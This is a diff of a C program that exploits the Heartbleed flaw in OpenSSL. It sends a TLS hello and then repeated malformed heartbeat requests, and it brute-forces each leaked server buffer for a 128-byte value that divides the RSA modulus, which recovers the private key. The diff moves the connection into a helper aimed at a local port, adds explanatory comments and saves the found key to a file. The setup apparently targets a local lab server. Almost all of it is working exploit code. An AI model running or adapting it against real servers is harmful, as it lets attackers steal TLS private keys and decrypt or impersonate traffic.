@@ -10,30 +10,53 @@
 #include <arpa/inet.h> 
 #include <sys/ioctl.h>
 #include <signal.h>
+
 #define BYTE_KEY 128
+
 #define HB_BUFF  262144
 #define HELLO_LEN 320
 #define HB_LEN 8
 #define SERV_HELLO 1324
 #define KEY_SCRAMBLED 301
 
+
+int connect_to_server() {
+    int sock = 0;
+    struct sockaddr_in serv_addr;
+
+    printf("\nConnecting...\n");
+    
+    sock=socket(AF_INET,SOCK_STREAM,0);
+    
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(5080);
+    serv_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
+    
+    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+
+    return sock;
+
+}
+    
+
 int main() {
 
     FILE *fp_pk, *fp_bleed;
+
     RSA *pk = NULL;
     BN_CTX *temp;
     BIGNUM *pk_q_test, *reminder;
+
     unsigned int cycle, num_read, i;
     char *buff;
     char serv_buff[SERV_HELLO];
     char *hb_buff;
     int sock;
-    struct sockaddr_in serv_addr;
     char ssl_hb[HB_LEN] =
-
     {
         0x18, 0x03, 0x00, 0x00, 0x03, 0x01, 0xFF, 0xFF
     };
+    
     char ssl_hello[HELLO_LEN] = 
         { 
         0x16,0x03,0x01,0x01,0x3b,0x01,0x00,0x01,0x37,0x03,0x00,0x53,
@@ -69,28 +92,24 @@ int main() {
     unsigned int count = 0;
     int n_read, resp_len, lost =0 , bytes_lost=0;
     int bytes_avail;
+    
     hb_buff = (char *) malloc(HB_BUFF*sizeof(char)); 
     fp_pk = fopen("private_unencrypted.pem", "rb");
     pk = PEM_read_RSAPrivateKey(fp_pk,NULL,NULL,NULL);
     fclose(fp_pk);
+
     if(pk == NULL) {
          printf("Error while reading the private key");
         return 1;
     }
-    conn:
-    
-    printf("\nConnecting...\n");
-    
-    sock=socket(AF_INET,SOCK_STREAM,0);
-    
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(443);
-    serv_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
-    
-    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-    
+
+    sock = connect_to_server();
+ 
     write(sock, ssl_hello, HELLO_LEN);
 
+    /*
+     * Reads the server  HELLO 
+     */
     n_read = recv(sock, serv_buff, 4096, 0);
 
     temp = BN_CTX_new();
@@ -98,20 +117,41 @@ int main() {
     reminder = BN_new();
     
     while(1) {
+        /*
+         * Sends the malformed heartbeat message 
+         */
         int w  = write(sock, ssl_hb, HB_LEN);
+
+        /*
+         * Returns -1 if the connection was closed by the server.
+         * Tries to connect again.
+         */
         if(w==-1) {
             close(sock);
-            BN_free(pk_q_test);
-            BN_free(reminder);
-            BN_CTX_free(temp);
-            goto conn;
+            sock = connect_to_server();
         }
+
         bytes_avail = 0, n_read =0, resp_len = 0;
+        
+        /*
+         * Reads the first chunk of bytes from the 
+         * server. Increments the pointer in the receiving
+         * buffer for the next chunk.
+         */
         n_read = recv(sock, hb_buff+resp_len, 4096, 0); 
         resp_len += n_read;
         do {
+            /*
+            i * Requests the number of bytes available to be
+             * read from the TCP buffer. If there's nothing
+             * to read, waits 500ms and tries again. If the
+             * receiving buffer is empty this second time, 
+             * assumes the response from the server is over.
+             * Otherwise keeps on reading.
+             */
             ioctl (sock,FIONREAD, &bytes_avail);
             if(bytes_avail == 0) {
+               
                 sleep(0.5);
                 ioctl (sock,FIONREAD, &bytes_avail);
                 if(bytes_avail == 0) 
@@ -121,27 +161,40 @@ int main() {
             resp_len += n_read;
         } while(1);
 
-        printf("hb req: %6d, resplen: %6d, lost: %6d, bytes_lost: %6d\r",
+        printf("hb req: %6d, resplen: %6d\r",
                 count,
-                resp_len,
-                lost,
-                bytes_lost);
+                resp_len);
 
+        /*
+         * Flushes the standard output, as there's no newline in the buffer.
+         * If we got a response from the server < BYTE_KEY, there is no
+         * point in looking for a 1024 bit key. Actually the lenght of the 
+         * proper HB message should be taken into consideration.
+         */
         fflush(0);
+
         if(resp_len < BYTE_KEY) {
-            bytes_lost += resp_len;
-            lost+=1;
             continue;
         }
         
+        /*
+         * Brute force loop to check every possible 128 bytes buffer
+         */
+
         for(i=0; i<resp_len-BYTE_KEY+1; i++) {
+
             BN_bin2bn((unsigned char*)(hb_buff+i), BYTE_KEY, pk_q_test);
             if(BN_is_one(pk_q_test) || BN_is_zero(pk_q_test))
+
                 continue;
             BN_mod(reminder, pk->n, pk_q_test, temp);
             if(BN_is_zero(reminder)) {
-                printf("I FOUND THE KEYYYYYY at offset %d!\n\n", i);
+                FILE *f_key = fopen("key_found", "w");
+                fprintf(f_key,"%s", BN_bn2hex(pk_q_test));
+
+                printf("\nThe key was found:\n\n");
                 printf("%s\n",BN_bn2hex(pk_q_test));
+
                 return 0;
             }
         }
